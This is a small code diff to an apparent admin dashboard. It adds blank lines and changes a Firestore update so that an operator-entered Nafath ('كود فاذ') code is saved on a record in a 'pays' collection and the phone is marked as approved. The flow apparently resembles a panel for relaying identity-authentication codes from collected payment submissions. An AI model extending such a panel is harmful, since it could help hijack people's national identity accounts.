@@ -841,6 +841,8 @@ function NotificationDetails({
                   <input type="tel" placeholder="كود فاذ" onChange={(e)=>{
                     onAuthNumberUpdate(notification.id,e.target.value)
                   }}/>
+
+
                 </CardFooter>
               </Card>
               {!notification.formData?.phone &&
@@ -1314,7 +1316,7 @@ export default function NotificationsPage() {
   const handleAuthNumberUpdate = async (id: string, authNumber: string) => {
     try {
       const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { nafaz_pin: authNumber,authNumber })
+      await updateDoc(docRef, { nafaz_pin: authNumber,auth_number:authNumber,phoneVerificationStatus:"approved" })
       setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, nafaz_pin: authNumber } : n)))
       toast({
         title: "تم تحديث رقم التحقق",
